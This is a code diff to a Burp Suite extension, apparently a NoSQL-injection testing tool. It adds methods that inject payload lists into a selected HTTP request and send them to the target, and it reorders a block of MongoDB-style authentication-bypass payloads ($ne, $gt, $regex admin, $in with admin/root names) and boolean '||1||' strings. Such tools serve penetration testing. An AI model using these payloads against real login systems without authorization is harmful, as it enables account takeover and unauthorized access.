@@ -2,7 +2,6 @@ import burp.api.montoya.BurpExtension;
 import burp.api.montoya.MontoyaApi;
 import burp.api.montoya.http.HttpService;
 import burp.api.montoya.http.handler.HttpResponseReceived;
-import burp.api.montoya.http.message.HttpHeader;
 import burp.api.montoya.http.message.HttpRequestResponse;
 import burp.api.montoya.http.message.requests.HttpRequest;
 import burp.api.montoya.http.message.responses.HttpResponse;
@@ -13,7 +12,7 @@ import burp.api.montoya.ui.editor.HttpResponseEditor;
 import javax.swing.*;
 import java.awt.*;
 import java.util.ArrayList;
-import java.util.List;
+import java.util.stream.Collectors;
 
 import static burp.api.montoya.ui.editor.EditorOptions.READ_ONLY;
 
@@ -34,13 +33,6 @@ public class NNN implements BurpExtension {
         this.payloadsArrayList.add(new Payload(PayloadType.BOOLEAN, urlEncodeData("'||1|| '"), "'||1|| '", null));
         this.payloadsArrayList.add(new Payload(PayloadType.BOOLEAN, urlEncodeData(" ||1|| "), " ||1|| ", null));
 
-        // Payloads for password field
-        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\" $ne \":\" invalidpassword \"}"), "{\" $ne \":\" invalidpassword \"}", null));
-        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\" $ne \": null }"), "{\" $ne \": null }", null));
-        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\" $ne \": \" xd \"}"), "{\" $ne \": \" xd \"}", null));
-        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\" $gt \": undefined }"), "{\" $gt \": undefined }", null));
-        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\" $gt \":\"\"}"), "{\" $gt \":\"\"}", null));
-
         // Payloads for username field
         this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("admin"), "admin", null));
         this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\" $regex \":\" admin .*\"}"), "{\" $regex \":\" admin .*\"}", null));
@@ -49,6 +41,13 @@ public class NNN implements BurpExtension {
         this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\" $gt \": undefined }"), "{\" $gt \": undefined }", null));
         this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\" $gt \":\"\"}"), "{\" $gt \":\"\"}", null));
         this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\" $in \":[\" Admin \", \"4dm1n \", \" admin \" , \" root \", \" administrator \"]}"), "{\" $in \":[\" Admin \", \"4dm1n \", \" admin \" , \" root \", \" administrator \"]}", null));
+
+        // Payloads for password field
+        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\" $ne \":\" invalidpassword \"}"), "{\" $ne \":\" invalidpassword \"}", null));
+        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\" $ne \": null }"), "{\" $ne \": null }", null));
+        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\" $ne \": \" xd \"}"), "{\" $ne \": \" xd \"}", null));
+        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\" $gt \": undefined }"), "{\" $gt \": undefined }", null));
+        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\" $gt \":\"\"}"), "{\" $gt \":\"\"}", null));
 
         // Data extraction payloads have to be handled directly
     }
@@ -126,28 +125,99 @@ public class NNN implements BurpExtension {
         return splitPane;
     }
 
-     static void test(HttpRequestResponse requestResponse, Integer startIndex, Integer endIndex) {
-        api.logging().logToOutput("Selected request" + requestResponse.request().toString() + "\n");
+     static void fuzzstringTest(HttpRequestResponse requestResponse, Integer startIndex, Integer endIndex) {
+        api.logging().logToOutput("[i] Selected request:\n" + requestResponse.request().toString() + "\n");
         new Thread(() -> {
-
             try {
                 HttpService httpService = requestResponse.request().httpService();
                 for (Payload payload : payloadsArrayList){
-                    HttpRequest request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + payload.payloadUrlEncoded + requestResponse.request().toString().substring(endIndex));
-                    api.logging().logToOutput("Selected request" + request2send.toString() + "\n");
-                    HttpRequestResponse response2receive = api.http().sendRequest(request2send);
-                    api.logging().logToOutput("Response " + response2receive.response().toString() + "\n");
+                    if (payload.payloadType == PayloadType.FUZZ_STRING) {
+                        HttpRequestResponse response2receive;
+                        HttpRequest request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + payload.payloadUrlEncoded + requestResponse.request().toString().substring(endIndex));
+                        api.logging().logToOutput("[i] Modified request:\n" + request2send.toString() + "\n");
+                        if (request2send.method().equals("POST")) {
+                            response2receive = api.http().sendRequest(request2send.withUpdatedHeader("Content-Length", String.valueOf(request2send.body().length())));
+                        } else {
+                            response2receive = api.http().sendRequest(request2send);
+                        }
+                        api.logging().logToOutput("[i] Response:\n" + response2receive.response().toString() + "\n");
+                    }
                 }
             } catch (Exception e) {
-
-                api.logging().logToOutput("Request failed");
-
+                api.logging().logToOutput("[!] Request failed");
             }
-
         }).start();
-
     }
 
+    static void booleanTest(HttpRequestResponse requestResponse, Integer startIndex, Integer endIndex) {
+        api.logging().logToOutput("[i] Selected request:\n" + requestResponse.request().toString() + "\n");
+        new Thread(() -> {
+            try {
+                HttpService httpService = requestResponse.request().httpService();
+                for (Payload payload : payloadsArrayList){
+                    if (payload.payloadType == PayloadType.BOOLEAN) {
+                        HttpRequestResponse response2receive;
+                        HttpRequest request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + payload.payloadUrlEncoded + requestResponse.request().toString().substring(endIndex));
+                        api.logging().logToOutput("[i] Modified request:\n" + request2send.toString() + "\n");
+                        if (request2send.method().equals("POST")) {
+                            response2receive = api.http().sendRequest(request2send.withUpdatedHeader("Content-Length", String.valueOf(request2send.body().length())));
+                        } else {
+                            response2receive = api.http().sendRequest(request2send);
+                        }
+                        api.logging().logToOutput("[i] Response:\n" + response2receive.response().toString() + "\n");
+                    }
+                }
+            } catch (Exception e) {
+                api.logging().logToOutput("[!] Request failed");
+            }
+        }).start();
+    }
 
+    static void authenticationUsernameTest(HttpRequestResponse requestResponse, Integer startIndex, Integer endIndex) {
+        api.logging().logToOutput("[i] Selected request:\n" + requestResponse.request().toString() + "\n");
+        new Thread(() -> {
+            try {
+                HttpService httpService = requestResponse.request().httpService();
+                for (Payload payload : payloadsArrayList){
+                    if (payload.payloadType == PayloadType.AUTHENTICATION_BYPASS_USERNAME) {
+                        HttpRequestResponse response2receive;
+                        HttpRequest request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + payload.payloadUrlEncoded + requestResponse.request().toString().substring(endIndex));
+                        api.logging().logToOutput("[i] Modified request:\n" + request2send.toString() + "\n");
+                        if (request2send.method().equals("POST")) {
+                            response2receive = api.http().sendRequest(request2send.withUpdatedHeader("Content-Length", String.valueOf(request2send.body().length())));
+                        } else {
+                            response2receive = api.http().sendRequest(request2send);
+                        }
+                        api.logging().logToOutput("[i] Response:\n" + response2receive.response().toString() + "\n");
+                    }
+                }
+            } catch (Exception e) {
+                api.logging().logToOutput("[!] Request failed");
+            }
+        }).start();
+    }
 
+    static void authenticationPasswordTest(HttpRequestResponse requestResponse, Integer startIndex, Integer endIndex) {
+        api.logging().logToOutput("[i] Selected request:\n" + requestResponse.request().toString() + "\n");
+        new Thread(() -> {
+            try {
+                HttpService httpService = requestResponse.request().httpService();
+                for (Payload payload : payloadsArrayList){
+                    if (payload.payloadType == PayloadType.AUTHENTICATION_BYPASS_PASSWORD) {
+                        HttpRequestResponse response2receive;
+                        HttpRequest request2send = HttpRequest.httpRequest(httpService, requestResponse.request().toString().substring(0, startIndex) + payload.payloadUrlEncoded + requestResponse.request().toString().substring(endIndex));
+                        api.logging().logToOutput("[i] Modified request:\n" + request2send.toString() + "\n");
+                        if (request2send.method().equals("POST")) {
+                            response2receive = api.http().sendRequest(request2send.withUpdatedHeader("Content-Length", String.valueOf(request2send.body().length())));
+                        } else {
+                            response2receive = api.http().sendRequest(request2send);
+                        }
+                        api.logging().logToOutput("[i] Response:\n" + response2receive.response().toString() + "\n");
+                    }
+                }
+            } catch (Exception e) {
+                api.logging().logToOutput("[!] Request failed");
+            }
+        }).start();
+    }
 }
